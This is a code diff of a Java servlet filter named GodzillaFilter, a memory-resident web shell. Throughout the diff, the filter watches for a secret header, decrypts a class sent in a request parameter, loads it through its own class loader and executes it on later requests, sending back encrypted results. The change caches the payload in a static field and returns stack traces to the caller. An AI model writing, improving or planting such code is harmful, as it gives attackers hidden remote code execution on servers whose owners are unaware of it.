@@ -5,19 +5,21 @@ import javax.crypto.spec.SecretKeySpec;
 import javax.servlet.*;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
-import javax.servlet.http.HttpSession;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
+import java.io.PrintWriter;
 
 /**
  * @author ReaJason
  */
 public class GodzillaFilter extends ClassLoader implements Filter {
-    public static String key;
-    public static String pass;
-    public static String md5;
-    public static String headerName;
-    public static String headerValue;
+    private static String key;
+    private static String pass;
+    private static String md5;
+    private static String headerName;
+    private static String headerValue;
+    private static Class<?> payload;
 
     public GodzillaFilter() {
     }
@@ -33,22 +35,26 @@ public class GodzillaFilter extends ClassLoader implements Filter {
         HttpServletResponse response = (HttpServletResponse) servletResponse;
         try {
             if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
-                HttpSession session = request.getSession();
-                byte[] data = base64Decode(request.getParameter(pass));
-                data = this.x(data, false);
-                Object cache = session.getAttribute(key);
-                if (cache == null) {
-                    session.setAttribute(key, (new GodzillaFilter(Thread.currentThread().getContextClassLoader())).Q(data));
-                } else {
-                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
-                    Object f = ((Class<?>) cache).newInstance();
-                    f.equals(arrOut);
-                    f.equals(request);
-                    f.equals(data);
-                    f.toString();
-                    response.getWriter().write(md5.substring(0, 16));
-                    response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));
-                    response.getWriter().write(md5.substring(16));
+                PrintWriter writer = response.getWriter();
+                try {
+                    byte[] data = base64Decode(request.getParameter(pass));
+                    data = this.x(data, false);
+                    if (payload == null) {
+                        payload = new GodzillaFilter(Thread.currentThread().getContextClassLoader()).Q(data);
+                    } else {
+                        ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
+                        Object f = payload.newInstance();
+                        f.equals(arrOut);
+                        f.equals(request);
+                        f.equals(data);
+                        f.toString();
+                        writer.write(md5.substring(0, 16));
+                        writer.write(base64Encode(this.x(arrOut.toByteArray(), true)));
+                        writer.write(md5.substring(16));
+                    }
+                } catch (Throwable e) {
+                    e.printStackTrace();
+                    writer.write(getErrorMessage(e));
                 }
                 return;
             }
@@ -102,6 +108,21 @@ public class GodzillaFilter extends ClassLoader implements Filter {
             return c.doFinal(s);
         } catch (Exception var4) {
             return null;
+        }
+    }
+
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
         }
     }
 
